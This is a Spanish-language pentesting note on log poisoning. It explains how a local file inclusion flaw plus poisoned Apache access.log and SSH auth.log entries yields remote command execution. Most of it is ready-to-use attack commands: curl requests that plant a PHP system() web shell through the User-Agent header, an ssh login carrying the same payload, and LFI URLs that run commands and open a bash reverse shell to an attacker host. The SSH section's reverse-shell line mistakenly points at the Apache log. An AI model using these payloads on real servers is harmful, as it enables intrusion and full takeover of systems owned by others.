# Log Poisoning (LFI -- RCE)

***

* Tags: #web #hacking #LFI #RCE #exploiting

***

## Definición

> El **Log Poisoning** es una técnica de ataque donde los registros del sistema se manipulan insertando información falsa o maliciosa. Esto distorsiona la percepción de los eventos, puede ocultar actividades maliciosas y llevar a decisiones incorrectas basadas en registros comprometidos. Esta técnica se suele utilizar junto a la vulnerabilidad de \[\[LFI (Local File Inclusion)]] para lograr una \[\[RCE (Remote Command Execution)]] en el servidor.
>
> Se puede utilizar esta técnica sobre archivos que seamos capaces de visualizar en la página web, y que además podamos modificarlos para introducir código malicioso, como los registros del servidor de **apache2**, los registros de **ssh** o el servicio de **SMTP** de correo electrónico.

***

## Apache logs

El archivo que se suele envenenar cuando se está utilizando apache, es el **access.log** , que está ubicado en la ruta **/var/log/apache2/access.log**. A través del **LFI**, podríamos poder visualizar el contenido del archivo si el usuario tuviera acceso del mismo, de manera que podemos envenenarlo incluyendo código **php**.

En dicho registro, hay una columna específica para mostrar la cabecera de **User-Agent** de cada solicitud que ha recibido el servidor web, por lo que si hacemos una petición modificando la cabecera, concretamente la de **User-Agent**, podemos inyectar código malicioso en **php**. Para ello podemos hacer uso del siguiente comando en **bash**:

```bash
curl -s -X GET "http://<IP_VICTIMA>/probando" -H "User-Agent: <?php system('whoami'); ?>"

#Para poder ver qué funciones de php están deshabilitadas en el servidor
curl -s -X GET "http://<IP_VICTIMA>/probando" -H "User-Agent: <?php phpinfo(); ?>"
```

Podemos hacerlo de manera general, para ir modificando la **URL** para ir cambiando el comando deseado:

```bash
curl -s -X GET "http://<IP_VICTIMA>/probando" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
```

Y a la para ejecutar el comando, añadimos a la URL lo siguiente:

```
http://<IP_VICTIMA>/index.php?filename=var/log/apache2/access.log&cmd=whoami
```

Para conseguir una \[\[Reverse shell]] podemos añadir lo siguiente:

```
http://<IP_VICTIMA>/index.php?filename=var/log/apache2/access.log&cmd=bash -c "bash -i >%26 /dev/tcp/<IP_ATACANTE>/<PUERTO> 0>%261"
```

***

## SSH logs

El archivo que se puede envenenar es **auth.log**, alojado en la ruta **/var/log/auth.log**, aunque el archivo también puede tener el nombre de **btmp** y encontrarse en el mismo directorio.

En el log, podemos visualizar errores de conexión de **SSH**, de manera que si se ha introducido un usuario o contraseña erróneo, será reflejado en el log. Esto nos es útil en el caso en el que podamos ver el output de este archivo en el servicio web, de manera que lo podemos envenenar de la siguiente manera:

```bash
ssh '<?php system(\$_GET['cmd']); ?>'@<IP_VICTIMA>
```

Y podemos ejecutar el comando que queramos utilizando **LFI**, de la siguiente manera:

```
http://<IP_VICTIMA>/index.php?filename=/var/log/auth.log&cmd=whoami

#Para una reverse shell
http://<IP_VICTIMA>/index.php?filename=var/log/apache2/access.log&cmd=bash -c "bash -i >%26 /dev/tcp/<IP_ATACANTE>/<PUERTO> 0>%261"
```
